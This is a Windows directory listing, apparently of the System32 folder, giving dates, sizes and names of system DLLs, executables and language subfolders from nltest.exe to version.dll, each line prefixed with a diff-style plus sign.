+29/10/2014  01:55           381,952 nltest.exe
+22/08/2013  15:38             1,696 NOISE.CHS
+22/08/2013  15:38             1,696 NOISE.CHT
+22/08/2013  15:38               741 NOISE.DAT
+18/06/2013  12:25             2,060 noise.jpn
+22/08/2013  15:38               697 NOISE.THA
+29/10/2014  02:00             4,096 normaliz.dll
+09/07/2015  16:30           212,992 notepad.exe
+20/01/2018  23:09           477,616 npdeployJava1.dll
+29/10/2014  01:57            19,456 npmproxy.dll
+29/10/2014  01:05            32,256 nshhttp.dll
+29/10/2014  01:40           380,928 nshipsec.dll
+07/11/2017  20:02           562,176 nshwfp.dll
+29/10/2014  03:05            20,120 nsi.dll
+29/10/2014  01:04            77,312 nslookup.exe
+29/10/2014  03:15           165,728 ntasn1.dll
+14/09/2017  19:29         1,502,000 ntdll.dll
+29/10/2014  01:04            92,672 ntdsapi.dll
+14/09/2016  18:40            19,456 ntdsperf.dll
+24/10/2017  20:27           346,112 ntdsutil.exe
+24/10/2017  20:27            74,240 ntfrsapi.dll
+24/10/2017  20:27            25,600 NTFRSPRF.dll
+29/10/2014  01:04            58,880 ntlanman.dll
+29/10/2014  01:32            16,896 ntlanui2.dll
+29/10/2014  03:15           154,392 ntmarta.dll
+11/08/2017  01:41           307,200 ntprint.dll
+29/10/2014  01:58            61,952 ntprint.exe
+25/08/2016  19:40           678,400 ntshrui.dll
+21/11/2015  17:50            14,336 ntvdm64.dll
+29/10/2014  01:20           558,080 objsel.dll
+31/10/2014  02:48           130,048 occache.dll
+29/10/2014  01:52           162,304 ocsetapi.dll
+29/10/2014  01:45           672,768 odbc32.dll
+29/10/2014  01:46            72,192 odbcad32.exe
+29/10/2014  01:58            38,912 odbcbcp.dll
+29/10/2014  01:37            25,600 odbcconf.dll
+29/10/2014  01:58            21,504 odbcconf.exe
+21/08/2013  23:58             4,453 odbcconf.rsp
+29/10/2014  01:46           110,592 odbccp32.dll
+29/10/2014  01:38            71,680 odbccr32.dll
+29/10/2014  01:37            72,192 odbccu32.dll
+22/08/2013  04:16           224,768 odbcint.dll
+29/10/2014  01:56            10,240 odbcji32.dll
+29/10/2014  01:56           317,440 odbcjt32.dll
+29/10/2014  01:38           138,240 odbctrac.dll
+29/10/2014  01:56             8,192 oddbse32.dll
+29/10/2014  01:56             7,680 odexl32.dll
+29/10/2014  01:56             8,192 odfox32.dll
+29/10/2014  01:56             8,192 odpdx32.dll
+29/10/2014  01:56             8,192 odtext32.dll
+29/10/2014  01:23           107,008 OEMLicense.dll
+29/10/2014  01:43           225,792 offfilt.dll
+12/09/2016  21:01            47,104 offreg.dll
+29/10/2014  01:47         1,096,192 ogldrv.dll
+22/08/2013  01:42             8,960 ole2.dll
+22/08/2013  01:42             8,960 ole2disp.dll
+22/08/2013  01:42             8,960 ole2nls.dll
+16/04/2017  09:07         1,213,792 ole32.dll
+29/10/2014  00:58           306,688 oleacc.dll
+29/10/2014  02:00             9,728 oleacchooks.dll
+22/08/2013  04:16             4,096 oleaccrc.dll
+16/04/2017  09:05           612,096 oleaut32.dll
+29/10/2014  01:51            84,992 olecli32.dll
+29/10/2014  01:51           105,984 oledlg.dll
+29/10/2014  01:25           111,616 oleprn.dll
+04/10/2016  20:08            86,016 olepro32.dll
+29/10/2014  01:51            31,744 olesvr32.dll
+29/10/2014  01:40            92,160 olethk32.dll
+29/10/2014  01:05            27,648 OnDemandConnRouteHelper.dll
+29/10/2014  00:57           203,264 onex.dll
+29/10/2014  01:41         1,068,032 onexui.dll
+21/01/2018  23:26    <DIR>          oobe
+29/10/2014  01:17         1,402,368 OpcServices.dll
+29/10/2014  01:47            61,440 openfiles.exe
+29/10/2014  01:57           777,728 opengl32.dll
+29/10/2014  03:10            91,936 OpenWith.exe
+29/10/2014  01:58            20,992 osbaseln.dll
+29/10/2014  01:21           755,712 osk.exe
+29/10/2014  02:00             8,192 OskSupport.dll
+29/10/2014  02:00             7,680 osuninst.dll
+29/10/2014  02:00            72,192 packager.dll
+29/10/2014  01:57            12,288 panmap.dll
+29/10/2014  01:05            16,384 PATHPING.EXE
+29/10/2014  00:59            54,272 pautoenr.dll
+29/10/2014  01:57            19,968 pcacli.dll
+29/10/2014  01:45            48,640 pcaui.dll
+29/10/2014  01:51            17,408 pcaui.exe
+18/06/2013  12:40               150 pcl.sep
+29/10/2014  01:01            53,248 PCPKsp.dll
+10/10/2017  15:08           367,104 PCPTpm12.dll
+22/08/2013  04:13            35,840 pcwum.dll
+02/09/2016  14:05           262,144 pdh.dll
+29/10/2014  01:52            47,104 pdhui.dll
+29/10/2014  00:48         1,170,432 PeerDistSh.dll
+29/10/2014  01:00            40,960 perfctrs.dll
+29/10/2014  01:05            34,816 perfdisk.dll
+22/08/2013  04:12            21,504 perfhost.exe
+29/10/2014  01:35           162,304 perfmon.exe
+18/06/2013  12:38           145,519 perfmon.msc
+29/10/2014  01:05            22,528 perfnet.dll
+29/10/2014  01:05            36,352 perfos.dll
+29/10/2014  01:05            36,864 perfproc.dll
+31/10/2017  22:24         2,669,068 PerfStringBackup.INI
+29/10/2014  01:58            13,824 perfts.dll
+29/10/2014  00:56           364,544 PhotoMetadataHandler.dll
+29/10/2014  03:10            26,304 PickerHost.exe
+29/10/2014  01:55            37,376 pid.dll
+22/08/2013  03:51           739,328 pidgenx.dll
+29/10/2014  01:05            18,432 PING.EXE
+29/10/2014  01:49           195,072 PkgMgr.exe
+13/03/2015  02:37           208,896 pku2u.dll
+22/08/2013  15:39    <DIR>          pl-PL
+29/10/2014  01:25         1,534,464 pla.dll
+29/10/2014  01:38            51,200 playlistfolder.dll
+29/10/2014  01:53            79,360 PlaySndSrv.dll
+29/10/2014  01:52            31,744 PlayToStatusProvider.dll
+31/10/2014  03:26            57,344 pngfilt.dll
+12/05/2016  15:43           291,328 polstore.dll
+30/10/2014  22:37           129,536 poqexec.exe
+29/10/2014  01:32           137,728 PortableDeviceSyncProvider.dll
+29/10/2014  01:04            28,160 pots.dll
+29/10/2014  01:31           202,240 powercfg.cpl
+29/10/2014  01:03            70,144 powercfg.exe
+29/10/2014  01:27           458,752 powercpl.dll
+29/10/2014  03:18           255,136 powrprof.dll
+30/07/2015  13:48           103,120 PresentationCFFRasterizerNative_v0300.dll
+22/08/2013  03:17           240,128 PresentationHost.exe
+22/08/2013  03:15            46,592 PresentationHostProxy.dll
+03/08/2013  04:41           778,936 PresentationNative_v0300.dll
+29/10/2014  01:39            15,360 prevhost.exe
+22/08/2013  04:17            13,824 prflbmsg.dll
+29/10/2014  01:59            14,336 print.exe
+08/09/2015  18:53         2,473,472 PrintConfig.dll
+29/10/2014  01:10           516,096 PrintDialogs.dll
+22/08/2013  16:05    <DIR>          Printing_Admin_Scripts
+29/10/2014  00:35         1,085,952 printui.dll
+29/10/2014  01:58            61,952 printui.exe
+29/10/2014  01:53           134,656 prncache.dll
+29/10/2014  01:34           473,600 prnfldr.dll
+29/10/2014  01:15           199,168 prnntfy.dll
+29/10/2014  01:48           144,896 prntvpt.dll
+29/10/2014  03:05            52,152 profapi.dll
+29/10/2014  00:59            45,568 profext.dll
+21/01/2018  23:01         2,411,008 propshts.dll
+29/10/2014  03:10         1,287,112 propsys.dll
+29/10/2014  01:40            30,208 proquota.exe
+29/10/2014  01:03           227,840 provthrd.dll
+29/10/2014  00:59            59,904 prvdmofcomp.dll
+29/10/2014  03:18            16,504 psapi.dll
+18/06/2013  12:40                51 pscript.sep
+22/08/2013  05:25            59,744 PSHED.DLL
+29/10/2014  00:46            38,912 PSModuleDiscoveryProvider.dll
+29/10/2014  01:32           566,784 psr.exe
+29/10/2014  01:56            13,824 pstorec.dll
+22/08/2013  15:39    <DIR>          pt-BR
+22/08/2013  15:39    <DIR>          pt-PT
+30/01/2016  17:48           167,424 puiapi.dll
+30/01/2016  18:18           367,104 puiobj.dll
+29/10/2014  01:34            44,032 pwrshplugin.dll
+29/10/2014  01:26           175,104 QAGENT.DLL
+29/10/2014  01:57            20,480 qappsrv.exe
+29/10/2014  01:22           229,376 qasf.dll
+22/08/2013  03:50           179,200 qcap.dll
+29/10/2014  01:44            62,464 QCLIPROV.DLL
+29/10/2014  01:46           293,376 qdv.dll
+03/12/2015  17:28           519,680 qdvd.dll
+29/10/2014  01:53            23,552 qmgrprxy.dll
+29/10/2014  01:58            23,040 qprocess.exe
+29/10/2014  01:25           155,648 QSHVHOST.DLL
+29/10/2014  01:25            91,648 QSVRMGMT.DLL
+03/03/2017  15:06         1,501,184 quartz.dll
+29/10/2014  01:35            70,144 Query.dll
+29/10/2014  01:58            14,336 query.exe
+29/10/2014  01:57            20,992 quser.exe
+29/10/2014  01:45            78,336 QUTIL.DLL
+29/10/2014  01:57            24,576 qwinsta.exe
+29/10/2014  00:46         1,265,152 RacEngn.dll
+08/02/2014  01:08           100,197 RacRules.xml
+29/10/2014  01:58            93,696 radardt.dll
+29/10/2014  01:16           291,840 RADCUI.dll
+22/08/2013  15:39    <DIR>          ras
+29/10/2014  01:05            12,288 rasadhlp.dll
+07/07/2016  19:14           628,736 rasapi32.dll
+29/10/2014  01:51            16,384 rasautou.exe
+29/10/2014  00:45           162,304 rascfg.dll
+29/10/2014  00:53           425,472 raschap.dll
+29/10/2014  00:59            10,752 raschapext.dll
+18/06/2013  12:34             1,820 rasctrnm.h
+29/10/2014  01:58            16,384 rasctrs.dll
+29/10/2014  01:33            61,440 rasdiag.dll
+29/10/2014  01:51            16,384 rasdial.exe
+29/10/2014  01:16           795,136 rasdlg.dll
+29/10/2014  01:07           856,064 rasgcw.dll
+07/07/2016  19:35           145,920 rasman.dll
+29/10/2014  01:27           248,320 rasmontr.dll
+29/10/2014  01:58            33,280 rasmxs.dll
+29/10/2014  01:51            45,056 rasphone.exe
+29/10/2014  01:44           400,384 rasplap.dll
+07/07/2016  20:11           185,856 rasppp.dll
+29/10/2014  01:58            22,528 rasser.dll
+22/08/2013  03:58            23,040 rassfm.dll
+12/08/2016  21:17           207,872 rastapi.dll
+06/08/2017  07:13           530,432 rastls.dll
+29/10/2014  00:59            10,240 rastlsext.dll
+22/08/2013  15:39    <DIR>          RasToast
+22/08/2013  03:40           181,760 rasuser.dll
+22/08/2013  04:07            19,968 RdmsInst.dll
+22/08/2013  04:16             2,048 rdmsres.dll
+29/10/2014  01:05         3,273,216 rdpcore.dll
+29/10/2014  01:25           236,544 rdpencom.dll
+29/10/2014  03:10           272,648 rdpendp.dll
+29/10/2014  01:29           248,320 rdpinit.exe
+29/10/2014  01:28            36,352 RdpSa.exe
+29/10/2014  00:44            22,528 RdpSaProxy.exe
+29/10/2014  01:57            11,264 RdpSaPs.dll
+29/10/2014  00:44            22,528 RdpSaUacHelper.exe
+29/10/2014  01:20           299,520 rdpshell.exe
+29/10/2014  01:26            74,752 rdpsign.exe
+10/07/2015  17:14           856,064 rdvidcrl.dll
+29/10/2014  01:20            67,584 rdvvmtransport.dll
+29/10/2014  01:15           809,472 ReAgent.dll
+29/10/2014  01:57            22,016 ReAgentc.exe
+29/10/2014  01:58            12,288 recover.exe
+22/08/2013  15:39    <DIR>          Recovery
+24/10/2017  20:27            12,800 redircmp.exe
+24/10/2017  20:27            12,800 redirusr.exe
+29/10/2014  01:05            61,952 reg.exe
+29/10/2014  01:57            77,824 regapi.dll
+29/10/2014  01:39            42,496 RegCtrl.dll
+29/10/2014  01:34           134,144 regedit.exe
+29/10/2014  01:52            10,240 regedt32.exe
+29/10/2014  01:59            40,960 regini.exe
+29/10/2014  01:04            13,312 Register-CimProvider.exe
+29/10/2014  01:52            16,384 regsvr32.exe
+29/10/2014  01:03           174,592 ReInfo.dll
+29/10/2014  01:22           119,808 rekeywiz.exe
+29/10/2014  01:04            38,400 relog.exe
+29/10/2014  01:28           205,824 remotepg.dll
+29/10/2014  01:33            87,552 remotesp.tsp
+29/10/2014  01:32            37,888 RemoveDeviceContextHandler.dll
+29/10/2014  01:38            10,752 RemoveDeviceElevated.dll
+24/10/2017  20:27           110,592 rendom.exe
+09/09/2016  14:02           253,952 repadmin.exe
+29/10/2014  01:59            18,432 replace.exe
+29/10/2014  01:58            14,848 reset.exe
+29/10/2014  01:45           108,032 resmon.exe
+21/08/2013  23:45               714 RestartManager.mof
+21/08/2013  23:45               176 RestartManagerUninstall.mof
+29/10/2014  01:44           229,376 resutils.dll
+29/10/2014  01:51           158,720 rgb9rast.dll
+29/10/2014  01:59           564,224 riched20.dll
+29/10/2014  02:00             9,216 riched32.dll
+29/10/2014  00:57           543,744 RMActivate.exe
+29/10/2014  00:57           562,688 RMActivate_isv.exe
+29/10/2014  00:56           482,304 RMActivate_ssp.exe
+29/10/2014  00:56           483,328 RMActivate_ssp_isv.exe
+29/10/2014  01:48            15,360 RmClient.exe
+29/10/2014  02:04             2,560 rnr20.dll
+22/08/2013  15:39    <DIR>          ro-RO
+29/10/2014  01:40           106,496 Robocopy.exe
+10/08/2013  00:39           155,648 rometadata.dll
+29/10/2014  01:00            19,456 ROUTE.EXE
+29/10/2014  01:57           161,280 rpchttp.dll
+29/10/2014  01:57             8,704 RpcNs4.dll
+29/10/2014  01:53            27,648 rpcnsh.dll
+29/10/2014  01:54            25,600 RpcPing.exe
+31/03/2016  03:40           747,520 rpcrt4.dll
+29/10/2014  03:10            52,664 RpcRtRemote.dll
+29/10/2014  03:15           192,096 rsaenh.dll
+29/10/2014  01:31           113,152 rshx32.dll
+18/06/2013  12:25            43,566 rsop.msc
+22/08/2013  03:43            76,288 rsopprov.exe
+29/10/2014  01:32           149,504 RstrtMgr.dll
+29/10/2014  01:25            27,648 rtffilt.dll
+29/10/2014  01:57           125,440 rtm.dll
+22/08/2013  03:14            67,072 rtrfiltr.dll
+29/10/2014  01:05            42,496 rtutils.dll
+29/10/2014  03:06           111,064 RTWorkQ.dll
+22/08/2013  15:39    <DIR>          ru-RU
+29/10/2014  01:51            17,920 runas.exe
+29/10/2014  01:40            51,200 rundll32.exe
+29/10/2014  01:39            58,368 RunLegacyCPLElevated.exe
+29/10/2014  01:38            34,816 runonce.exe
+29/10/2014  01:58            18,944 rwinsta.exe
+29/10/2014  01:05            64,512 samcli.dll
+04/02/2017  17:19            65,024 samlib.dll
+29/10/2014  01:59             9,216 sas.dll
+29/10/2014  01:05            60,928 sc.exe
+29/10/2014  01:46            67,072 SCardDlg.dll
+29/10/2014  01:01           214,016 scecli.dll
+09/12/2014  03:45           393,728 scesrv.dll
+06/04/2017  16:15           358,912 schannel.dll
+29/10/2014  01:05            18,944 schedcli.dll
+24/10/2017  20:27           272,896 schmmgmt.dll
+01/08/2015  03:45           182,784 schtasks.exe
+13/08/2017  16:33           252,416 scksp.dll
+22/08/2013  03:47            33,792 scrdenrl.dll
+18/06/2013  13:07            37,876 SCregEdit.wsf
+29/10/2014  01:43            61,952 scripto.dll
+29/10/2014  01:57            10,240 scrnsave.scr
+29/10/2014  01:51           189,440 scrobj.dll
+11/08/2017  21:19           482,304 scrptadm.dll
+29/10/2014  01:51           168,448 scrrun.dll
+29/10/2014  01:51            21,504 sdbinst.exe
+01/09/2016  14:20           204,800 SDClient.dll
+29/10/2014  01:46           185,856 sdiageng.dll
+29/10/2014  01:50            21,504 sdiagnhost.exe
+29/10/2014  01:31           156,672 sdiagprv.dll
+29/10/2014  01:45           429,568 sdohlp.dll
+29/10/2014  00:39         1,000,448 SearchFolder.dll
+29/10/2014  01:04            37,376 SecEdit.exe
+23/03/2015  21:45           257,216 sechost.dll
+29/10/2014  00:57           348,160 secproc.dll
+29/10/2014  00:57           346,624 secproc_isv.dll
+29/10/2014  01:52            89,600 secproc_ssp.dll
+29/10/2014  01:52            89,600 secproc_ssp_isv.dll
+29/10/2014  01:06            24,064 secur32.dll
+22/08/2013  04:14             5,120 security.dll
+29/10/2014  01:28            65,024 sendmail.dll
+29/10/2014  02:00            10,752 SensApi.dll
+29/10/2014  01:46            15,360 serialui.dll
+18/06/2013  12:23            92,746 services.msc
+29/10/2014  01:57            19,968 serwvdrv.dll
+11/06/2017  20:02           299,520 SessEnv.dll
+29/10/2014  01:28           258,560 sethc.exe
+29/10/2014  01:48            23,552 setspn.exe
+21/01/2018  23:26    <DIR>          setup
+29/10/2014  01:13            25,600 setup16.exe
+29/10/2014  03:18         1,782,912 setupapi.dll
+29/10/2014  01:46           109,056 setupugc.exe
+29/10/2014  01:04            46,592 setx.exe
+22/08/2013  04:13             3,072 sfc.dll
+29/10/2014  01:48            34,304 sfc.exe
+29/10/2014  02:00            42,496 sfc_os.dll
+18/07/2015  18:29           148,480 shacct.dll
+29/10/2014  03:10           560,392 SHCore.dll
+19/08/2017  16:48           215,040 shdocvw.dll
+09/09/2017  17:55        19,790,760 shell32.dll
+22/08/2013  04:16           517,120 shellstyle.dll
+29/10/2014  01:57             8,192 shfolder.dll
+29/10/2014  02:00            23,040 shgina.dll
+29/10/2014  02:00             5,632 shimeng.dll
+29/10/2014  01:26            17,408 shimgvw.dll
+29/10/2014  03:10           278,352 shlwapi.dll
+29/10/2014  01:38            16,896 shpafact.dll
+29/10/2014  01:34           393,728 shrpubw.exe
+09/10/2016  14:08            95,232 shsetup.dll
+29/10/2014  00:49           576,512 shsvcs.dll
+29/10/2014  02:00            19,968 shunimpl.dll
+29/10/2014  01:40            31,232 shutdown.exe
+29/10/2014  01:20           425,984 shwebsvc.dll
+29/10/2014  01:27            44,032 signdrv.dll
+22/08/2013  04:16             7,680 simpdata.tlb
+29/10/2014  01:59            20,480 sisbkup.dll
+22/08/2013  15:39    <DIR>          sk-SK
+22/08/2013  15:39    <DIR>          sl-SI
+22/02/2014  11:06           148,992 slc.dll
+22/08/2013  02:46            19,456 slcext.dll
+22/08/2013  16:05    <DIR>          slmgr
+18/06/2013  12:35           142,904 slmgr.vbs
+22/08/2013  04:01            75,776 slwga.dll
+29/10/2014  00:52         1,054,208 SmartcardCredentialProvider.dll
+29/10/2014  01:39           217,088 SmartScreenSettings.exe
+29/10/2014  01:30            85,504 SMBHelperClass.dll
+22/08/2013  13:36    <DIR>          SMI
+29/10/2014  01:04            11,776 smphost.dll
+29/10/2014  03:11           190,048 SndVol.exe
+29/10/2014  00:30           221,696 SndVolSSO.dll
+29/10/2014  01:05            26,624 snmpapi.dll
+29/10/2014  01:40           138,240 softkbd.dll
+29/10/2014  02:00            10,240 softpub.dll
+29/10/2014  01:58            20,992 sort.exe
+29/10/2014  02:00            40,960 SortServer2003Compat.dll
+29/10/2014  02:00            40,960 SortWindows61.dll
+29/10/2014  02:00            55,808 SortWindows6Compat.dll
+29/10/2014  01:58            67,584 spbcd.dll
+22/08/2013  15:39    <DIR>          Speech
+29/10/2014  02:00            87,040 spfileq.dll
+29/10/2014  02:00            81,408 SPInf.dll
+29/10/2014  01:57             8,704 spnet.dll
+29/10/2014  01:52            17,408 spopk.dll
+22/08/2013  15:39    <DIR>          spp
+22/02/2014  11:05            95,232 sppc.dll
+22/08/2013  03:43           421,888 sppcext.dll
+22/08/2013  02:33           555,520 sppinst.dll
+21/01/2018  23:26    <DIR>          sppui
+22/08/2013  03:49           111,616 sppwmi.dll
+29/10/2014  01:27           380,416 spwizeng.dll
+22/08/2013  04:16         5,864,448 spwizimg.dll
+22/08/2013  04:16         5,927,936 spwizimg_svr.dll
+22/08/2013  04:16             7,680 spwizres.dll
+29/10/2014  01:50           119,808 sqlcecompact40.dll
+29/10/2014  01:50           175,616 sqlceoledb40.dll
+29/10/2014  01:49           742,400 sqlceqp40.dll
+29/10/2014  01:53           433,152 sqlcese40.dll
+29/10/2014  01:50           711,680 sqlsrv32.dll
+22/08/2013  04:16            93,696 sqlsrv32.rll
+18/06/2013  12:19           188,768 sqlunirl.dll
+18/06/2013  12:18            17,760 sqlwid.dll
+18/06/2013  12:18            43,872 sqlwoa.dll
+29/10/2014  03:12           241,680 sqmapi.dll
+22/08/2013  15:39    <DIR>          sr-Latn-CS
+22/08/2013  15:39    <DIR>          sr-Latn-RS
+29/10/2014  01:25         1,812,992 SRH.dll
+29/10/2014  01:37           304,128 SrpUxNativeSnapIn.dll
+29/10/2014  03:15           110,512 srvcli.dll
+02/05/2017  17:35            31,744 sscore.dll
+29/10/2014  01:57            52,224 ssdpapi.dll
+29/10/2014  01:06           104,960 sspicli.dll
+29/10/2014  02:03           115,712 SSShim.dll
+29/10/2014  00:59            53,760 stclient.dll
+22/08/2013  04:16            16,896 stdole2.tlb
+18/06/2013  12:31             7,168 stdole32.tlb
+29/10/2014  00:41           305,152 stobject.dll
+22/08/2013  01:42             8,960 storage.dll
+29/10/2014  01:33            60,928 StorageContextHandler.dll
+06/01/2017  17:04         1,495,552 storagewmi.dll
+29/10/2014  01:00            19,968 storagewmi_passthru.dll
+29/10/2014  01:42            57,856 Storprop.dll
+06/05/2016  15:23           503,808 StructuredQuery.dll
+29/10/2014  01:59            14,336 subst.exe
+29/10/2014  01:30           597,504 sud.dll
+22/08/2013  15:39    <DIR>          sv-SE
+29/10/2014  03:17            33,088 svchost.exe
+29/10/2014  01:56           499,200 sxs.dll
+29/10/2014  00:58            17,920 sxshared.dll
+29/10/2014  01:50            24,576 sxsstore.dll
+29/10/2014  01:55            29,184 sxstrace.exe
+29/10/2014  01:39            40,960 SyncHost.exe
+29/10/2014  01:56            10,752 SyncHostps.dll
+29/10/2014  01:25           335,872 SyncInfrastructure.dll
+29/10/2014  01:56            16,896 SyncInfrastructureps.dll
+29/10/2014  01:48            62,464 Syncreg.dll
+29/10/2014  01:17           287,232 sysdm.cpl
+29/10/2014  01:57            29,184 syskey.exe
+11/06/2017  21:07           416,256 sysmon.ocx
+22/08/2013  15:46    <DIR>          sysprep
+18/06/2013  12:40             3,317 sysprint.sep
+18/06/2013  12:40             3,666 sysprtj.sep
+29/10/2014  01:57            14,336 syssetup.dll
+29/10/2014  01:18           274,944 systemcpl.dll
+29/10/2014  01:29            78,336 systeminfo.exe
+29/10/2014  01:39            81,920 SystemPropertiesAdvanced.exe
+29/10/2014  01:39            81,920 SystemPropertiesComputerName.exe
+29/10/2014  01:39            81,920 SystemPropertiesDataExecutionPrevention.exe
+29/10/2014  01:39            81,920 SystemPropertiesHardware.exe
+29/10/2014  01:39            81,920 SystemPropertiesPerformance.exe
+29/10/2014  01:39            81,920 SystemPropertiesProtection.exe
+29/10/2014  01:39            81,920 SystemPropertiesRemote.exe
+29/10/2014  01:51             8,704 systray.exe
+08/09/2017  17:39           113,152 t2embed.dll
+29/10/2014  01:51            51,712 takeown.exe
+29/10/2014  01:44           872,960 tapi3.dll
+29/10/2014  01:42           198,656 tapi32.dll
+18/06/2013  12:41            41,761 tapimgmt.msc
+29/10/2014  01:39            46,080 TapiMigPlugin.dll
+29/10/2014  01:58             9,216 tapiperf.dll
+22/08/2013  03:14           288,768 tapisnap.dll
+29/10/2014  01:34           254,464 tapisrv.dll
+29/10/2014  01:52             9,728 TapiSysprep.dll
+22/08/2013  04:16           108,544 tapiui.dll
+29/10/2014  01:58            12,288 TapiUnattend.exe
+29/10/2014  00:44           393,728 taskcomp.dll
+01/08/2015  03:37           359,936 taskeng.exe
+29/10/2014  01:28            78,848 taskkill.exe
+29/10/2014  01:28            80,896 tasklist.exe
+29/10/2014  03:18         1,103,768 Taskmgr.exe
+22/08/2013  15:39    <DIR>          Tasks
+29/10/2014  03:18           848,568 taskschd.dll
+18/06/2013  12:39           145,059 taskschd.msc
+29/10/2014  01:01            34,816 TaskSchdPS.dll
+29/10/2014  01:05            23,552 tbs.dll
+29/10/2014  01:57            14,336 tcmsetup.exe
+18/06/2013  12:40             1,673 tcpbidi.xml
+29/10/2014  01:19           181,760 tcpipcfg.dll
+29/10/2014  01:52            31,232 tcpmib.dll
+29/10/2014  00:46           178,176 tcpmon.dll
+18/06/2013  12:40            60,124 tcpmon.ini
+29/10/2014  01:33            60,416 tcpmonui.dll
+29/10/2014  01:05            10,240 TCPSVCS.EXE
+16/04/2017  07:29            73,216 tdc.ocx
+20/03/2015  02:16           749,568 tdh.dll
+29/10/2014  01:58           107,008 telephon.cpl
+29/10/2014  01:45           378,880 termmgr.dll
+22/08/2013  15:39    <DIR>          th-TH
+29/10/2014  01:22         2,551,808 themecpl.dll
+29/10/2014  01:29         2,848,768 themeui.dll
+29/10/2014  01:00            46,592 threadpoolwinrt.dll
+29/10/2014  00:44           128,512 thumbcache.dll
+29/10/2014  01:39            29,696 ThumbnailExtractionHost.exe
+22/08/2013  15:38             1,988 ticrf.rat
+29/10/2014  00:41           472,064 timedate.cpl
+29/10/2014  01:58             8,704 TimeDateMUICallback.dll
+29/10/2014  01:51            26,112 timeout.exe
+22/08/2013  02:50           113,152 TlsBrand.dll
+29/10/2014  01:57            47,104 tlscsp.dll
+18/06/2013  12:57           144,862 tpm.msc
+29/10/2014  01:25            41,472 tpmcompc.dll
+29/10/2014  01:22            89,600 TpmInit.exe
+22/08/2013  15:39    <DIR>          tr-TR
+20/03/2015  02:41           369,152 tracerpt.exe
+29/10/2014  01:05            14,848 TRACERT.EXE
+29/10/2014  01:53            35,328 traffic.dll
+29/10/2014  01:58            17,408 tree.com
+29/10/2014  01:58            12,800 tsbyuv.dll
+29/10/2014  01:10           189,440 tscfgwmi.dll
+29/10/2014  01:56            13,312 TSChannel.dll
+29/10/2014  01:58            19,456 tscon.exe
+29/10/2014  01:58            19,968 tsdiscon.exe
+22/08/2013  04:04            11,264 tsec.dll
+22/08/2013  03:53            28,672 tsecimp.exe
+29/10/2014  01:43            52,736 tsgqec.dll
+29/10/2014  01:58            20,480 tskill.exe
+29/10/2014  01:03            80,896 TSpkg.dll
+22/08/2013  03:28            37,376 tsprop.dll
+22/08/2013  03:18            75,776 tsPubIconHelper.dll
+29/10/2014  01:16           190,976 tspubwmi.dll
+01/06/2016  16:32            93,184 tssdjet.dll
+29/10/2014  01:47            39,424 TSTheme.exe
+22/08/2013  03:21           113,664 tsuserex.dll
+29/10/2014  01:09           809,984 TSWorkspace.dll
+09/06/2014  22:13            35,480 TsWpfWrp.exe
+29/10/2014  00:55           162,816 TtlsAuth.dll
+29/10/2014  00:51           236,032 TtlsCfg.dll
+29/10/2014  01:00            13,824 TtlsExt.dll
+29/10/2014  01:32           129,536 twext.dll
+29/10/2014  03:10           492,232 twinapi.appcore.dll
+29/10/2014  00:42           654,848 twinapi.dll
+23/07/2016  18:12           954,880 twinui.appcore.dll
+09/09/2017  15:21        12,879,360 twinui.dll
+29/10/2014  00:58           102,400 txflog.dll
+29/10/2014  02:03            11,776 txfw32.dll
+22/08/2013  01:42             8,960 typelib.dll
+29/10/2014  01:04            41,472 typeperf.exe
+22/08/2013  04:17             2,048 tzres.dll
+29/10/2014  01:58            47,104 tzutil.exe
+22/08/2013  02:22            87,040 ualapi.dll
+29/10/2014  01:38            48,128 ucmhc.dll
+07/09/2017  13:40           922,432 ucrtbase.dll
+29/10/2014  01:39            58,880 udhisapi.dll
+06/06/2017  18:02            74,240 uexfat.dll
+06/06/2017  18:02           106,496 ufat.dll
+08/10/2016  21:21           254,464 UIAnimation.dll
+29/10/2014  00:59         1,021,440 UIAutomationCore.dll
+22/08/2013  04:16            34,816 UIAutomationCoreRes.dll
+29/10/2014  01:26            37,376 uicom.dll
+29/10/2014  01:33           165,376 uireng.dll
+29/10/2014  01:26         3,561,984 UIRibbon.dll
+29/10/2014  02:04           638,976 UIRibbonRes.dll
+22/08/2013  15:39    <DIR>          uk-UA
+06/06/2017  18:03           143,360 ulib.dll
+22/08/2013  04:16           185,344 umcRes.dll
+29/10/2014  01:58            18,944 umdmxfrm.dll
+29/10/2014  01:53           280,576 unimdm.tsp
+29/10/2014  01:58            61,952 unimdmat.dll
+29/10/2014  01:51            17,408 uniplat.dll
+29/10/2014  01:05            34,816 unlodctr.exe
+06/06/2017  18:02           513,536 untfs.dll
+29/10/2014  01:41           327,680 upnp.dll
+29/10/2014  01:51            22,528 upnpcont.exe
+29/10/2014  00:42           331,776 upnphost.dll
+06/06/2017  18:56           375,296 uReFS.dll
+29/10/2014  01:58            24,064 ureg.dll
+31/10/2014  03:24           235,520 url.dll
+07/11/2017  20:01         1,313,280 urlmon.dll
+29/10/2014  01:51           116,224 usbceip.dll
+29/10/2014  01:45           244,736 usbmon.dll
+29/10/2014  01:57            11,776 usbperf.dll
+29/10/2014  01:45            74,752 usbui.dll
+29/10/2014  01:14             4,096 user.exe
+09/11/2016  17:25         1,376,768 user32.dll
+29/10/2014  03:10            30,944 UserAccountBroker.exe
+29/10/2014  01:33            66,560 UserAccountControlSettings.dll
+29/10/2014  01:44           218,112 UserAccountControlSettings.exe
+29/10/2014  01:07         1,197,056 usercpl.dll
+29/10/2014  03:15            98,152 userenv.dll
+29/10/2014  01:05            22,528 userinit.exe
+29/10/2014  01:04            16,384 userinitext.dll
+29/10/2014  01:01            10,240 UserLanguageProfileCallback.dll
+29/10/2014  00:53           550,400 UserLanguagesCpl.dll
+29/10/2014  02:03            77,312 usp10.dll
+29/10/2014  01:39            45,568 ustprov.dll
+29/10/2014  03:10            38,184 utildll.dll
+29/10/2014  01:29            70,144 Utilman.exe
+06/06/2017  18:57           141,824 uudf.dll
+10/10/2017  15:42            50,176 UXInit.dll
+29/10/2014  01:40           125,952 uxlib.dll
+22/08/2013  04:16             2,560 uxlibres.dll
+10/10/2017  14:58           949,760 uxtheme.dll
+29/10/2014  00:43           461,312 VAN.dll
+29/10/2014  01:16           675,328 Vault.dll
+29/10/2014  01:00            84,480 vaultcli.dll
+18/06/2013  12:17            30,749 vbajet32.dll
+14/11/2017  00:32           499,200 vbscript.dll
+29/10/2014  01:59            17,408 vdmdbg.dll
+29/10/2014  01:59            48,128 vds_ps.dll
+29/10/2014  01:53            11,264 verclsid.exe
+29/10/2014  03:18           348,048 verifier.dll
+29/10/2014  01:48           129,536 verifier.exe
+29/10/2014  03:10            26,304 version.dll
